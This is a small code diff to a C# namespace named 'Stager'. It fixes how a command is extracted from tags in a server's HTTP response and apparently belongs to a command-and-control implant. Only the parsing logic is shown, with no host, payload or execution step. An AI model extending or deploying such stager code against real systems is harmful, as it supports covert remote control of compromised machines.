@@ -300,9 +300,9 @@ namespace Stager
                 Console.WriteLine("[*] End Message");
 #endif
                 // Get the command and parse it
-                int startCommand = responseBody.IndexOf("&ltcommand&gt");
-                int endCommand = responseBody.IndexOf("&lt/command&gt");
-                string cmdString = responseBody.Substring(startCommand + "&ltcommand&gt".Length, endCommand - startCommand - "&lt/command&gt".Length + 1);
+                int startCommand = responseBody.IndexOf("&lt;command&gt;");
+                int endCommand = responseBody.IndexOf("&lt;/command&gt;");
+                string cmdString = responseBody.Substring(startCommand + "&lt;command&gt;".Length, endCommand - startCommand - "&lt;/command&gt;".Length + 1);
                 stagerCommand.Timestamp = DateTime.Now;
                 stagerCommand.FullCommandString = cmdString;
 #if DEBUG
